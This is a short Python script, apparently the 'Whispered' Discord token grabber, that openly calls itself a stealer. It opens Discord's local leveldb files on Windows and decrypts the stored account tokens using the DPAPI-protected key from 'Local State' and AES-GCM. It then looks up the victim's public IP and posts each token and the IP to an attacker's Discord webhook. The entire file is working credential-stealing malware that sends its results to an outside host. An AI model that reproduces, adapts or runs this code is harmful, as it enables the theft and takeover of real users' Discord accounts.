import requests
from discord_webhook import DiscordWebhook, DiscordEmbed
import os
import json
import requests
import re
import base64
import win32crypt
from Crypto.Cipher import AES

path = os.getenv("APPDATA") + '\\discord'
response = requests.get("https://ifconfig.me")
webhook = DiscordWebhook(url="WebHook_URL", username = "Whispered Bot", avatar_url = "https://avatars.githubusercontent.com/u/91149112")

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []

    for file in os.listdir(path):
        if not file.endswith(".ldb") and file.endswith(".log"):
            continue

        try:
            for line in (x.strip() for x in open(f"{path}{file}", "r", errors="ignore").readlines()):
                for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    tokens.append(values)
        except PermissionError:
            continue

    return tokens
    
def getkey(path):
    with open(path + f"\\Local State", "r") as file:
        key = json.loads(file.read())['os_crypt']['encrypted_key']
        file.close()
    return key



for token in gettokens(path):
    if token.endswith("\\"):
        token = token.replace("\\", "")  
    else:
        token
    token = AES.new(win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1], AES.MODE_GCM, base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()

    embed = DiscordEmbed(title=f"**WHISPERED got an HIT !**",
                            url="https://github.com/NinjaPanic",
                            description=f"""||@everyone||\n\n**### TOKEN:** ```yaml\n{token}``` \n**### IP:**```yaml\n{response.text}```""",
                            color="9B26B6"
                            )
    embed.set_footer(text="Stolen by NinjaPanic ・ https://github.com/NinjaPanic")
    webhook.add_embed(embed)
    webhook.execute()